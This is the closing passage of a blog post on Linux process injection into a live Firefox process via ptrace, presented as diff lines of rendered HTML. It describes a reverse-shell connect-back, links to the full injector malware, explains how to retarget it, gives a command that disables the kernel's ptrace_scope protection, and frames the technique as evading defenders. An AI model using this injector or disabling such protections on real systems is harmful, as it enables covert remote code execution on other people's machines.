+<p>The following shows a successful execution of the injector injecting into a <code class="language-plaintext highlighter-rouge">Firefox</code> process.</p>
+
+<p><img src="https://i.imgur.com/JlSK1Bp.png" alt="Malware Injector" /></p>
+
+<p>The following is the task-manager on Kali Linux showing an <code class="language-plaintext highlighter-rouge">sh</code> process as a child process of the above <code class="language-plaintext highlighter-rouge">Firefox</code> process with the same <code class="language-plaintext highlighter-rouge">PID</code>. This is similar to the common <code class="language-plaintext highlighter-rouge">cmd.exe</code> as a child process of an unsual suspicious process in Windows mainly an <code class="language-plaintext highlighter-rouge">IOC</code> for Remote Process Injection.</p>
+
+<p><img src="https://i.imgur.com/EU2mEiu.png" alt="Task Manager" /></p>
+
+<p>The following show as successful connect-back to ur listening port.</p>
+
+<p><img src="https://i.imgur.com/9qYboUS.png" alt="Connect Back" /></p>
+
+<p>The complete code injection malware can be found <a href="https://github.com/mutur4/Linux-Malware/blob/main/Process.Injection/firefox-injector.c">here</a>. The <code class="language-plaintext highlighter-rouge">strstr</code> function inside the <code class="language-plaintext highlighter-rouge">EnumProcess</code> function can be modified to inject into a specific process that suits you needs or it can be commented out to let the injector inject into a random process.</p>
+
+<p>One of the major caveat’s about <code class="language-plaintext highlighter-rouge">ptrace</code> is that there is a protection/mitigation where the Kernel is configured to prevent any process from calling <code class="language-plaintext highlighter-rouge">ptrace</code> on another process that it did not create via <code class="language-plaintext highlighter-rouge">fork</code>.If this feature is enabled the above process injector will not work. This can be temporarily disabled until the next boot using the following command.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo </span>0 | <span class="nb">sudo tee</span> /proc/sys/kernel/yama/ptrace_scope
+</code></pre></div></div>
+
+<h3 id="conclusion">Conclusion</h3>
+<p>This was a Linux Process Injection technique that was aimed at emulating the Windows <code class="language-plaintext highlighter-rouge">CreateRemoteThread</code> and <code class="language-plaintext highlighter-rouge">VirtualAllocEx</code> injection process to inject into a Live Firefox process for remote code execution. This is a nice evasion technique that should blind the BlueTeam.</p>
+
+<h3 id="references">References</h3>
+<ul>
+  <li>[1] https://github.com/gaffe23/linux-inject</li>
+</ul>
+
+
+  </div>
+
+  <a class="u-url" href="/2023/10/04/Linux-Remote-Process-Injection.html" hidden></a>
+</article>
+
+      </div>
+    </main><link id="fa-stylesheet" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css">
+
+<footer class="site-footer h-card">
+  <data class="u-url" value="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+      </div>
+      <div class="footer-col">
+        <p></p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+    <a rel="me" href="https://x.com/BinaryChunk" target="_blank" title="BinaryChunk on X">
+      <span class="grey fa-brands fa-x-twitter fa-lg"></span>
+    </a>
+  </li><li>
+    <a rel="me" href="https://github.com/mutur4" target="_blank" title="BinaryChunk on Github">
+      <span class="grey fa-brands fa-github fa-lg"></span>
+    </a>
+  </li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+
+</body>
+
+</html>
